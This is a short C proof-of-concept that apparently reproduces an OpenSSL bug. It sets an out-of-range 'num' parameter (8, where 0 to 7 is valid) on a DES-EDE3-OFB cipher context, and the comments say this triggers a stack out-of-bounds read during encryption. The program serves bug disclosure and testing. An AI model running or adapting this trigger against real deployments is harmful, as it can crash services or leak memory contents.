#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/params.h>
#include <openssl/core_names.h>

int main(void)
{
    EVP_CIPHER_CTX *ctx = NULL;
    EVP_CIPHER *cipher = NULL;
    unsigned char key[24] = {0};
    unsigned char iv[8]   = {0};
    unsigned char in[16]  = "AAAAAAAAAAAAAAAA";
    unsigned char out[32] = {0};
    int outlen = 0;
    unsigned int bad_num = 8;  /* out-of-range: valid is 0-7 */
    OSSL_PARAM params[2];

    cipher = EVP_CIPHER_fetch(NULL, "DES-EDE3-OFB", NULL);
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex2(ctx, cipher, key, iv, NULL);

    /* Set num=8 (valid: 0-7). No validation in set_params. */
    params[0] = OSSL_PARAM_construct_uint(OSSL_CIPHER_PARAM_NUM, &bad_num);
    params[1] = OSSL_PARAM_construct_end();
    EVP_CIPHER_CTX_set_params(ctx, params);

    printf("ctx->num set to %u (valid range: 0-7)\n", bad_num);
    printf("Calling EVP_EncryptUpdate...\n");

    /* Triggers stack OOB read in DES_ede3_ofb64_encrypt at d[8] */
    EVP_EncryptUpdate(ctx, out, &outlen, in, sizeof(in));

    EVP_CIPHER_CTX_free(ctx);
    EVP_CIPHER_free(cipher);
    return 0;
}
